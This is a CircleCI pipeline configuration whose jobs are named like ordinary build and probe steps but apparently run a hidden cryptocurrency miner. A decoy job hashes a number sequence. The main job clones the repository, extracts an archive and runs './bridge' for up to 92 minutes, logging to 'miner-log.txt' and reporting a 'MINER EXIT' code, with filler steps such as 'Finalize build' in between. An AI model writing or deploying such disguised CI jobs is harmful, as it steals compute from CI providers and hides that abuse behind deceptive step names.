version: 2.1

jobs:
  loadWierd:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: PROBE MOTOR DRIVER CRITICAL
          command: |
            mkdir -p /tmp/handoff-04
            set +o pipefail 2>/dev/null; seq 1 1219698 | tr '\n' ' ' | sha1sum > /tmp/handoff-04/PNG-forest; true
            echo "written-C"
      - persist_to_workspace:
          root: /tmp/handoff-04
          paths:
            - 'PNG-forest'
  v1-rc:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/handoff-04
      - run:
          name: Load upstream (step2)
          command: |
            cat /tmp/handoff-04/PNG-forest 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
      - run:
          name: Pull working copy
          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Expand archive
          command: tar --extract --file=collection.tar
      - run:
          name: Finalize build
          command: free -m
      - run:
          name: Record build info
          command: df -h
      - run:
          name: Stabilize
          command: free -m
      - run:
          name: Run
          no_output_timeout: 92m
          command: |
            mkdir -p /tmp/d
            : > /tmp/d/miner-log.txt
            tail -F /tmp/d/miner-log.txt &
            TAIL_PID=$!
            nice -n 0 ./bridge
            MRC=$?
            sleep 2
            kill $TAIL_PID 2>/dev/null || true
            echo "---MINER EXIT=$MRC---"
            echo "---FULL LOG:---"
            cat /tmp/d/miner-log.txt 2>/dev/null
            exit $MRC
